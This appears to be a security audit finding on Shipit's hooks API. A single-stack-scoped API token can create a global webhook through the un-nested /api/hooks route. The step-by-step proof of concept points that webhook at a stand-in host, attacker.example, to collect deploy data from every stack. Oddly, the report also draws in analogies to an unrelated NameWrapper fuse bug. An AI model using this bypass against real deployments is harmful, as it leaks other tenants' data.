### Title
Stack-scoped `ApiClient` can create a global webhook via the top-level `/api/hooks` route, bypassing its `stack_id` authorization scope - (File: `app/controllers/shipit/api/hooks_controller.rb`)

### Summary
An `ApiClient` restricted to a single `stack_id` is meant to have its permissions bound to that one stack, exactly analogous to how `PARENT_CANNOT_CONTROL` should bind a subdomain's fuses so the parent can never touch it. `Shipit::Api::BaseController#stacks` enforces this binding for stack-scoped resources: `current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all` [1](#0-0) . However, `Shipit::Api::HooksController` is mounted twice — once nested under a stack (`/api/stacks/:stack_id/hooks`) and once at the top level (`/api/hooks`) — both routed to the identical controller [2](#0-1) . The controller's own scoping logic derives `stack_id` purely from `params[:stack_id].presence`, defaulting to `nil` (a global, unscoped hook) whenever that param is absent [3](#0-2) . The permission check is only `require_permission :write, :hook`, which never consults `current_api_client.stack_id` [4](#0-3)  and [5](#0-4) .

### Finding Description
The binding that should hold is: `stack a token authorizes == stack the token's writes affect`. Before the attack: an `ApiClient` created with `stack: some_stack, permissions: ['write:hook']` should only ever be able to create/update/destroy `Hook` rows with `stack_id: some_stack.id`, since `Hook.global` (`stack_id: nil`) hooks fire for *every* stack in the installation, per `Hook.deliver`/`Hook.for_stack` (`for_stack(stack_id) { where(stack_id: [nil, stack_id]) }`).

Root cause: like the NameWrapper bug where re-invoking `wrap` on a subnode failed to re-check ancestor-level fuses, `Api::HooksController#create` never re-checks the calling `ApiClient`'s `stack_id` scope; it only checks whether the *route* happened to supply a `stack_id` param. By simply calling the un-nested `POST /api/hooks` endpoint instead of `POST /api/stacks/:stack_id/hooks`, the stack-scoped restriction is silently dropped and a global `Hook` is created.

After the attack: the same stack-scoped `ApiClient` (still only authorized for `some_stack`) now owns a `Hook` with `stack_id: nil`, which the `Hook.deliver` scope matches for `for_stack(any_stack_id)` (`where(stack_id: [nil, stack_id])`), meaning the attacker's registered `delivery_url` receives `stack`, `deploy`, `task`, `merge`, `pull_request`, etc. events (which can include `github_access_token`-adjacent commit/user metadata and deploy output links) for every stack in the deployment, not just the one it was scoped to.

### Impact Explanation
This crosses the "escalation into unauthenticated read of stack state / task streams / deploy output" High-severity category: an attacker holding only a single-stack-scoped token can register a webhook receiver that leaks event data (commit shas, deploy links, stack names, user info) for repositories/stacks it was never granted access to, and can silently persist this cross-stack exfiltration channel indefinitely since there's no additional confirmation step.

### Likelihood Explanation
Likelihood is high for any deployment that issues scoped `ApiClient` tokens (e.g., via `CCMenuUrlController`'s pattern of creating clients with narrow `permissions: %w[read:stack]`, or any integrator granting a service only `write:hook` + a `stack_id`) — the attacker needs no special access beyond the token they already legitimately hold, and the bypass is a single alternate route call, not a chain of preconditions.

### Recommendation
In `Shipit::Api::HooksController`, always intersect the effective `stack_id` with the acting `current_api_client.stack_id` (raise/`404` if the client is stack-scoped but the request targets `stack_id: nil`, and force `stack_id` to `current_api_client.stack_id` when the client is scoped), mirroring the same scoping already applied in `BaseController#stacks`. Alternatively, remove the top-level `resources :hooks` route entirely for stack-scoped clients, or add a `before_action` that raises `ApiClient::InsufficientPermission` when `current_api_client.stack_id?` and the requested hook's `stack_id` does not match.

### Proof of Concept
1. As an admin, create `ApiClient.create!(creator: user, name: 'X', stack: stack_a, permissions: ['write:hook'])`.
2. Authenticate as that client and call `POST /api/hooks` (the top-level, non-nested route) with `{ delivery_url: 'https://attacker.example/collect', events: ['deploy', 'task', 'merge'] }` — no `stack_id` is supplied.
3. `Api::HooksController#stack_id` returns `nil` because `params[:stack_id]` is absent, so `hooks.create(params)` creates `Hook.new(stack_id: nil, ...)`.
4. Trigger a deploy on an unrelated `stack_b`; `Hook.deliver(:deploy, stack_b.id, payload)` matches the attacker's global hook via `for_stack(stack_b.id) { where(stack_id: [nil, stack_b.id]) }`, and the attacker's `delivery_url` receives `stack_b`'s deploy event data, despite the `ApiClient` being scoped only to `stack_a`.
